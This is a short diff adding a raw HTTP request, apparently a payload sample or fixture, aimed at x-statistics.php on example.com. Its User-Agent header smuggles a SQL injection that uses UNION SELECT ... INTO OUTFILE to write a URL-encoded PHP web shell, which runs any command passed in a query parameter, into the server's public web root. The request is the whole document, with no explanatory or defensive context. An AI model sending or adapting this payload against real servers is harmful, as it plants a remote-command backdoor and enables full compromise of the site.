@@ -1,0 +1,4 @@
+GET /x-statistics.php HTTP/1.1
+Host: www.example.com
+User-Agent: sOmeStuF' UNION SELECT '%3C%3Fsystem%28%24_GET%5B%22c%22%5D%29%3B%3F%3E' INTO OUTFILE '/usr/webserver/public_html/rshell.php
+
